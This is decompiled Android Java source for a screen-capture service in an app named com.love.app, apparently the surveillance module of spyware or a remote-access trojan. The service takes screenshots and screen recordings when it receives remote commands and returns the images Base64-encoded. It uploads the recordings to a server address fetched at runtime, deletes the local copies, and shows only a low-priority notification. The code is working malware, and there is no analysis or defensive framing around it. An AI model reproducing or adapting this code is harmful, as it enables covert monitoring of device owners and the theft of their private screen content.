package com.love.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import com.android.mms.service_alt.MmsHttpClient;
import com.android.mms.transaction.TransactionBundle;
import com.android.volley.toolbox.HttpHeaderParser;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import org.json.JSONObject;

/* JADX INFO: loaded from: classes.dex */
public class ScreenCaptureService extends Service {
    public static final String ACTION_RECORD_START = "record_start";
    public static final String ACTION_RECORD_STOP = "record_stop";
    public static final String ACTION_SCREENSHOT = "screenshot";
    private static final String CHANNEL_ID = "screen_capture";
    public static final String EXTRA_CMD_ID = "cmd_id";
    public static final String EXTRA_DATA = "data";
    public static final String EXTRA_RESULT_CODE = "result_code";
    private static final int NOTIF_ID = 8888;
    private static final String TAG = "ScreenCaptureService";
    private ImageReader imageReader;
    private MediaProjection mediaProjection;
    private MediaRecorder mediaRecorder;
    private MediaProjectionManager mpm;
    private String recordingFilePath;
    private int screenDpi;
    private int screenHeight;
    private int screenWidth;
    private VirtualDisplay virtualDisplay;
    private boolean recording = false;
    private Handler handler = new Handler(Looper.getMainLooper());

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        this.mpm = (MediaProjectionManager) getSystemService("media_projection");
        DisplayMetrics displayMetrics = getResources().getDisplayMetrics();
        this.screenWidth = displayMetrics.widthPixels;
        this.screenHeight = displayMetrics.heightPixels;
        this.screenDpi = displayMetrics.densityDpi;
        startForegroundNotif();
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        if (intent == null) {
            stopSelf();
            return 2;
        }
        String stringExtra = intent.getStringExtra(ScreenCaptureActivity.EXTRA_MODE);
        int intExtra = intent.getIntExtra("result_code", -1);
        Intent intent2 = (Intent) intent.getParcelableExtra(EXTRA_DATA);
        String stringExtra2 = intent.getStringExtra("cmd_id");
        if (stringExtra == null) {
            stringExtra = ACTION_SCREENSHOT;
        }
        if (ACTION_RECORD_STOP.equals(stringExtra)) {
            stopRecording(stringExtra2);
            return 2;
        }
        if (intExtra == -1 || intent2 == null) {
            ForegroundService.sendResultStatic("screenshot_error", "No MediaProjection token", stringExtra2);
            stopSelf();
            return 2;
        }
        MediaProjection mediaProjection = this.mediaProjection;
        if (mediaProjection != null) {
            mediaProjection.stop();
            this.mediaProjection = null;
        }
        this.mediaProjection = this.mpm.getMediaProjection(intExtra, intent2);
        if (ACTION_RECORD_START.equals(stringExtra)) {
            startRecording(stringExtra2);
        } else {
            takeScreenshot(stringExtra2);
        }
        return 2;
    }

    private void takeScreenshot(final String str) {
        try {
            ImageReader imageReaderNewInstance = ImageReader.newInstance(this.screenWidth, this.screenHeight, 1, 2);
            this.imageReader = imageReaderNewInstance;
            this.virtualDisplay = this.mediaProjection.createVirtualDisplay("ScreenCapture", this.screenWidth, this.screenHeight, this.screenDpi, 16, imageReaderNewInstance.getSurface(), null, null);
            this.handler.postDelayed(new Runnable() { // from class: com.love.app.ScreenCaptureService$$ExternalSyntheticLambda1
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.m356lambda$takeScreenshot$0$comloveappScreenCaptureService(str);
                }
            }, 300L);
        } catch (Exception e) {
            ForegroundService.sendResultStatic("screenshot_error", e.getMessage(), str);
            stopSelf();
        }
    }

    /* JADX INFO: renamed from: lambda$takeScreenshot$0$com-love-app-ScreenCaptureService, reason: not valid java name */
    /* synthetic */ void m356lambda$takeScreenshot$0$comloveappScreenCaptureService(String str) {
        try {
            try {
                Image imageAcquireLatestImage = this.imageReader.acquireLatestImage();
                if (imageAcquireLatestImage == null) {
                    ForegroundService.sendResultStatic("screenshot_error", "frame null", str);
                    cleanup();
                    stopSelf();
                    return;
                }
                Image.Plane[] planes = imageAcquireLatestImage.getPlanes();
                int width = imageAcquireLatestImage.getWidth();
                int height = imageAcquireLatestImage.getHeight();
                int pixelStride = planes[0].getPixelStride();
                Bitmap bitmapCreateBitmap = Bitmap.createBitmap(((planes[0].getRowStride() - (pixelStride * width)) / pixelStride) + width, height, Bitmap.Config.ARGB_8888);
                bitmapCreateBitmap.copyPixelsFromBuffer(planes[0].getBuffer());
                imageAcquireLatestImage.close();
                Bitmap bitmapCreateBitmap2 = Bitmap.createBitmap(bitmapCreateBitmap, 0, 0, width, height);
                bitmapCreateBitmap.recycle();
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                bitmapCreateBitmap2.compress(Bitmap.CompressFormat.JPEG, 85, byteArrayOutputStream);
                bitmapCreateBitmap2.recycle();
                ForegroundService.sendResultStatic(ACTION_SCREENSHOT, Base64.encodeToString(byteArrayOutputStream.toByteArray(), 2), str);
            } catch (Exception e) {
                ForegroundService.sendResultStatic("screenshot_error", e.getMessage(), str);
            }
        } finally {
            cleanup();
            stopSelf();
        }
    }

    private void startRecording(String str) {
        try {
            this.recordingFilePath = getCacheDir() + "/rec_" + new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date()) + ".mp4";
            MediaRecorder mediaRecorder = new MediaRecorder();
            this.mediaRecorder = mediaRecorder;
            mediaRecorder.setVideoSource(2);
            this.mediaRecorder.setOutputFormat(2);
            this.mediaRecorder.setOutputFile(this.recordingFilePath);
            this.mediaRecorder.setVideoEncoder(2);
            this.mediaRecorder.setVideoSize(this.screenWidth, this.screenHeight);
            this.mediaRecorder.setVideoFrameRate(30);
            this.mediaRecorder.setVideoEncodingBitRate(3000000);
            this.mediaRecorder.prepare();
            this.virtualDisplay = this.mediaProjection.createVirtualDisplay("ScreenRecord", this.screenWidth, this.screenHeight, this.screenDpi, 16, this.mediaRecorder.getSurface(), null, null);
            this.mediaRecorder.start();
            this.recording = true;
            getSharedPreferences("love_config", 0).edit().putString("record_path", this.recordingFilePath).apply();
            ForegroundService.sendResultStatic("record_status", "started", str);
        } catch (Exception e) {
            Log.e(TAG, "MediaRecorder start error", e);
            ForegroundService.sendResultStatic("record_error", "Recorder error: " + e.getMessage(), str);
            cleanup();
            stopSelf();
        }
    }

    private void stopRecording(final String str) {
        MediaRecorder mediaRecorder;
        try {
            if (this.recording && (mediaRecorder = this.mediaRecorder) != null) {
                try {
                    mediaRecorder.stop();
                } catch (Exception e) {
                    Log.e(TAG, "stopRecording: recorder.stop() failed", e);
                }
                this.mediaRecorder.release();
                this.mediaRecorder = null;
                this.recording = false;
            }
            VirtualDisplay virtualDisplay = this.virtualDisplay;
            if (virtualDisplay != null) {
                virtualDisplay.release();
                this.virtualDisplay = null;
            }
            MediaProjection mediaProjection = this.mediaProjection;
            if (mediaProjection != null) {
                mediaProjection.stop();
                this.mediaProjection = null;
            }
            String string = this.recordingFilePath;
            if (string == null) {
                string = getSharedPreferences("love_config", 0).getString("record_path", null);
            }
            if (string != null) {
                final File file = new File(string);
                if (file.exists() && file.length() > 0) {
                    new Thread(new Runnable() { // from class: com.love.app.ScreenCaptureService$$ExternalSyntheticLambda0
                        @Override // java.lang.Runnable
                        public final void run() {
                            this.f$0.m355lambda$stopRecording$1$comloveappScreenCaptureService(file, str);
                        }
                    }).start();
                    return;
                } else {
                    ForegroundService.sendResultStatic("record_status", "stopped file missing", str);
                    stopSelf();
                    return;
                }
            }
            ForegroundService.sendResultStatic("record_status", "stopped", str);
            stopSelf();
        } catch (Exception e2) {
            Log.e(TAG, "stopRecording error", e2);
            ForegroundService.sendResultStatic("record_error", e2.getMessage(), str);
            stopSelf();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* JADX INFO: renamed from: uploadVideoFile, reason: merged with bridge method [inline-methods] */
    public void m355lambda$stopRecording$1$comloveappScreenCaptureService(File file, String str) {
        try {
            try {
                String baseUrl = ConfigFetcher.getBaseUrl(this);
                if (baseUrl == null) {
                    return;
                }
                String str2 = "===" + System.currentTimeMillis() + "===";
                HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(baseUrl + "/upload").openConnection();
                httpURLConnection.setDoOutput(true);
                httpURLConnection.setRequestMethod(MmsHttpClient.METHOD_POST);
                httpURLConnection.setRequestProperty(HttpHeaderParser.HEADER_CONTENT_TYPE, "multipart/form-data; boundary=" + str2);
                DataOutputStream dataOutputStream = new DataOutputStream(httpURLConnection.getOutputStream());
                dataOutputStream.writeBytes("--" + str2 + "\r\n");
                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"\r\n");
                dataOutputStream.writeBytes("Content-Type: video/mp4\r\n\r\n");
                FileInputStream fileInputStream = new FileInputStream(file);
                byte[] bArr = new byte[16384];
                while (true) {
                    int i = fileInputStream.read(bArr);
                    if (i == -1) {
                        break;
                    } else {
                        dataOutputStream.write(bArr, 0, i);
                    }
                }
                fileInputStream.close();
                dataOutputStream.writeBytes("\r\n--" + str2 + "--\r\n");
                dataOutputStream.flush();
                dataOutputStream.close();
                if (httpURLConnection.getResponseCode() == 200) {
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                    String line = bufferedReader.readLine();
                    if (line != null) {
                        String strOptString = new JSONObject(line).optString("url");
                        JSONObject jSONObject = new JSONObject();
                        jSONObject.put(TransactionBundle.TRANSACTION_TYPE, "screen_record");
                        jSONObject.put("url", strOptString);
                        jSONObject.put("size", file.length());
                        ForegroundService.sendResultStatic("screen_record_complete", jSONObject.toString(), str);
                    }
                    bufferedReader.close();
                    file.delete();
                }
            } catch (Exception e) {
                Log.e(TAG, "Upload video failed", e);
                ForegroundService.sendResultStatic("record_error", "Upload failed: " + e.getMessage(), str);
            }
        } finally {
            stopSelf();
        }
    }

    private void cleanup() {
        ImageReader imageReader = this.imageReader;
        if (imageReader != null) {
            imageReader.close();
            this.imageReader = null;
        }
        VirtualDisplay virtualDisplay = this.virtualDisplay;
        if (virtualDisplay != null) {
            virtualDisplay.release();
            this.virtualDisplay = null;
        }
        MediaProjection mediaProjection = this.mediaProjection;
        if (mediaProjection != null) {
            mediaProjection.stop();
            this.mediaProjection = null;
        }
    }

    private void startForegroundNotif() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel notificationChannel = new NotificationChannel(CHANNEL_ID, "Screen Capture", 2);
            NotificationManager notificationManager = (NotificationManager) getSystemService("notification");
            if (notificationManager != null) {
                notificationManager.createNotificationChannel(notificationChannel);
            }
        }
        Notification notificationBuild = new NotificationCompat.Builder(this, CHANNEL_ID).setContentTitle("Mengambil data layar").setSmallIcon(android.R.drawable.ic_menu_camera).setPriority(-1).setOngoing(true).build();
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(NOTIF_ID, notificationBuild, 32);
        } else {
            startForeground(NOTIF_ID, notificationBuild);
        }
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        cleanup();
        MediaRecorder mediaRecorder = this.mediaRecorder;
        if (mediaRecorder != null) {
            mediaRecorder.release();
            this.mediaRecorder = null;
        }
    }
}
